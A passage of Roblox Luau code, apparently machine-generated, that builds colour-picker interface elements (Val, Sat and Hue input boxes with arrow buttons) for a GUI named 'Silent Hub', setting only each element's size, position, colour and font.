G2L["9e"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9e"]["Name"] = [[Arrow]];
G2L["9e"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["9f"] = Instance.new("Frame", G2L["9e"]);
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9f"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["9f"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["a0"] = Instance.new("Frame", G2L["9e"]);
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a0"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["a0"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["a1"] = Instance.new("Frame", G2L["9e"]);
G2L["a1"]["BorderSizePixel"] = 0;
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a1"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["a1"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["a1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val
G2L["a2"] = Instance.new("Frame", G2L["71"]);
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["a2"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["a2"]["Position"] = UDim2.new(1, -180, 0, 255);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["a2"]["Name"] = [[Val]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Title
G2L["a3"] = Instance.new("TextLabel", G2L["a2"]);
G2L["a3"]["TextSize"] = 14;
G2L["a3"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a3"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a3"]["BackgroundTransparency"] = 1;
G2L["a3"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a3"]["Text"] = [[Val:]];
G2L["a3"]["Name"] = [[Title]];
G2L["a3"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input
G2L["a4"] = Instance.new("TextBox", G2L["a2"]);
G2L["a4"]["Name"] = [[Input]];
G2L["a4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a4"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["a4"]["TextSize"] = 14;
G2L["a4"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a4"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["a4"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["a4"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["a4"]["Text"] = [[255]];
G2L["a4"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame
G2L["a5"] = Instance.new("Frame", G2L["a4"]);
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["a5"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a5"]["Name"] = [[ArrowFrame]];
G2L["a5"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down
G2L["a6"] = Instance.new("TextButton", G2L["a5"]);
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["TextSize"] = 14;
G2L["a6"]["AutoButtonColor"] = false;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a6"]["BackgroundTransparency"] = 1;
G2L["a6"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a6"]["Text"] = [[]];
G2L["a6"]["Name"] = [[Down]];
G2L["a6"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow
G2L["a7"] = Instance.new("Frame", G2L["a6"]);
G2L["a7"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a7"]["Name"] = [[Arrow]];
G2L["a7"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["a8"] = Instance.new("Frame", G2L["a7"]);
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a8"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["a8"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["a8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["a9"] = Instance.new("Frame", G2L["a7"]);
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["a9"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["a9"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["aa"] = Instance.new("Frame", G2L["a7"]);
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["aa"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["aa"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up
G2L["ab"] = Instance.new("TextButton", G2L["a5"]);
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["TextSize"] = 14;
G2L["ab"]["AutoButtonColor"] = false;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ab"]["BackgroundTransparency"] = 1;
G2L["ab"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ab"]["Text"] = [[]];
G2L["ab"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow
G2L["ac"] = Instance.new("Frame", G2L["ab"]);
G2L["ac"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["ac"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ac"]["Name"] = [[Arrow]];
G2L["ac"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["ad"] = Instance.new("Frame", G2L["ac"]);
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ad"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["ad"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["ae"] = Instance.new("Frame", G2L["ac"]);
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ae"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["ae"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["ae"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["af"] = Instance.new("Frame", G2L["ac"]);
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["af"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["af"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["af"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat
G2L["b0"] = Instance.new("Frame", G2L["71"]);
G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["b0"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["b0"]["Position"] = UDim2.new(1, -180, 0, 233);
G2L["b0"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["b0"]["Name"] = [[Sat]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Title
G2L["b1"] = Instance.new("TextLabel", G2L["b0"]);
G2L["b1"]["TextSize"] = 14;
G2L["b1"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b1"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b1"]["BackgroundTransparency"] = 1;
G2L["b1"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["b1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b1"]["Text"] = [[Sat:]];
G2L["b1"]["Name"] = [[Title]];
G2L["b1"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input
G2L["b2"] = Instance.new("TextBox", G2L["b0"]);
G2L["b2"]["Name"] = [[Input]];
G2L["b2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b2"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["b2"]["TextSize"] = 14;
G2L["b2"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b2"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["b2"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["b2"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["b2"]["Text"] = [[0]];
G2L["b2"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame
G2L["b3"] = Instance.new("Frame", G2L["b2"]);
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["b3"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b3"]["Name"] = [[ArrowFrame]];
G2L["b3"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down
G2L["b4"] = Instance.new("TextButton", G2L["b3"]);
G2L["b4"]["BorderSizePixel"] = 0;
G2L["b4"]["TextSize"] = 14;
G2L["b4"]["AutoButtonColor"] = false;
G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b4"]["BackgroundTransparency"] = 1;
G2L["b4"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["b4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b4"]["Text"] = [[]];
G2L["b4"]["Name"] = [[Down]];
G2L["b4"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow
G2L["b5"] = Instance.new("Frame", G2L["b4"]);
G2L["b5"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["b5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b5"]["Name"] = [[Arrow]];
G2L["b5"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["b6"] = Instance.new("Frame", G2L["b5"]);
G2L["b6"]["BorderSizePixel"] = 0;
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b6"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["b6"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["b7"] = Instance.new("Frame", G2L["b5"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b7"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["b7"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["b8"] = Instance.new("Frame", G2L["b5"]);
G2L["b8"]["BorderSizePixel"] = 0;
G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b8"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["b8"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["b8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up
G2L["b9"] = Instance.new("TextButton", G2L["b3"]);
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["TextSize"] = 14;
G2L["b9"]["AutoButtonColor"] = false;
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b9"]["BackgroundTransparency"] = 1;
G2L["b9"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["b9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b9"]["Text"] = [[]];
G2L["b9"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow
G2L["ba"] = Instance.new("Frame", G2L["b9"]);
G2L["ba"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["ba"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ba"]["Name"] = [[Arrow]];
G2L["ba"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["bb"] = Instance.new("Frame", G2L["ba"]);
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bb"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["bb"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["bb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["bc"] = Instance.new("Frame", G2L["ba"]);
G2L["bc"]["BorderSizePixel"] = 0;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bc"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["bc"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["bd"] = Instance.new("Frame", G2L["ba"]);
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bd"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["bd"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue
G2L["be"] = Instance.new("Frame", G2L["71"]);
G2L["be"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["be"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["be"]["Position"] = UDim2.new(1, -180, 0, 211);
G2L["be"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["be"]["Name"] = [[Hue]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Title
G2L["bf"] = Instance.new("TextLabel", G2L["be"]);
G2L["bf"]["TextSize"] = 14;
G2L["bf"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["bf"]["BackgroundTransparency"] = 1;
G2L["bf"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bf"]["Text"] = [[Hue:]];
G2L["bf"]["Name"] = [[Title]];
G2L["bf"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input
G2L["c0"] = Instance.new("TextBox", G2L["be"]);
G2L["c0"]["Name"] = [[Input]];
G2L["c0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c0"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["c0"]["TextSize"] = 14;
G2L["c0"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c0"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["c0"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["c0"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["c0"]["Text"] = [[0]];
G2L["c0"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame
G2L["c1"] = Instance.new("Frame", G2L["c0"]);
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["c1"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c1"]["Name"] = [[ArrowFrame]];
G2L["c1"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down
G2L["c2"] = Instance.new("TextButton", G2L["c1"]);
G2L["c2"]["BorderSizePixel"] = 0;
G2L["c2"]["TextSize"] = 14;
G2L["c2"]["AutoButtonColor"] = false;
G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c2"]["BackgroundTransparency"] = 1;
G2L["c2"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["c2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c2"]["Text"] = [[]];
G2L["c2"]["Name"] = [[Down]];
G2L["c2"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow
G2L["c3"] = Instance.new("Frame", G2L["c2"]);
G2L["c3"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c3"]["Name"] = [[Arrow]];
G2L["c3"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["c4"] = Instance.new("Frame", G2L["c3"]);
G2L["c4"]["BorderSizePixel"] = 0;
G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c4"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["c4"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["c4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["c5"] = Instance.new("Frame", G2L["c3"]);
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c5"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["c5"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["c5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["c6"] = Instance.new("Frame", G2L["c3"]);
G2L["c6"]["BorderSizePixel"] = 0;
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c6"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["c6"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["c6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up
G2L["c7"] = Instance.new("TextButton", G2L["c1"]);
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["TextSize"] = 14;
G2L["c7"]["AutoButtonColor"] = false;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c7"]["BackgroundTransparency"] = 1;
G2L["c7"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c7"]["Text"] = [[]];
G2L["c7"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow
G2L["c8"] = Instance.new("Frame", G2L["c7"]);
G2L["c8"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["c8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c8"]["Name"] = [[Arrow]];
G2L["c8"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["c9"] = Instance.new("Frame", G2L["c8"]);
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["c9"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["c9"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["c9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["ca"] = Instance.new("Frame", G2L["c8"]);
G2L["ca"]["BorderSizePixel"] = 0;
G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["ca"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["ca"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["ca"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["cb"] = Instance.new("Frame", G2L["c8"]);
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["cb"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["cb"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["cb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame
G2L["cc"] = Instance.new("Frame", G2L["71"]);
G2L["cc"]["BorderSizePixel"] = 0;
G2L["cc"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["cc"]["Size"] = UDim2.new(0, 5, 0, 208);
G2L["cc"]["Position"] = UDim2.new(1, -16, 0, 1);
G2L["cc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["cc"]["Name"] = [[ArrowFrame]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow
G2L["cd"] = Instance.new("Frame", G2L["cc"]);
G2L["cd"]["Size"] = UDim2.new(0, 8, 0, 16);
G2L["cd"]["Position"] = UDim2.new(0, -2, 0, -4);
G2L["cd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["cd"]["Name"] = [[Arrow]];
G2L["cd"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["ce"] = Instance.new("Frame", G2L["cd"]);
G2L["ce"]["BorderSizePixel"] = 0;
G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ce"]["Size"] = UDim2.new(0, 1, 0, 9);
G2L["ce"]["Position"] = UDim2.new(0, 6, 0, 4);
G2L["ce"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["cf"] = Instance.new("Frame", G2L["cd"]);
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Size"] = UDim2.new(0, 1, 0, 7);
G2L["cf"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["cf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["d0"] = Instance.new("Frame", G2L["cd"]);
G2L["d0"]["BorderSizePixel"] = 0;
G2L["d0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d0"]["Size"] = UDim2.new(0, 1, 0, 5);
G2L["d0"]["Position"] = UDim2.new(0, 4, 0, 6);
G2L["d0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["d1"] = Instance.new("Frame", G2L["cd"]);
G2L["d1"]["BorderSizePixel"] = 0;
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d1"]["Size"] = UDim2.new(0, 1, 0, 3);
G2L["d1"]["Position"] = UDim2.new(0, 3, 0, 7);
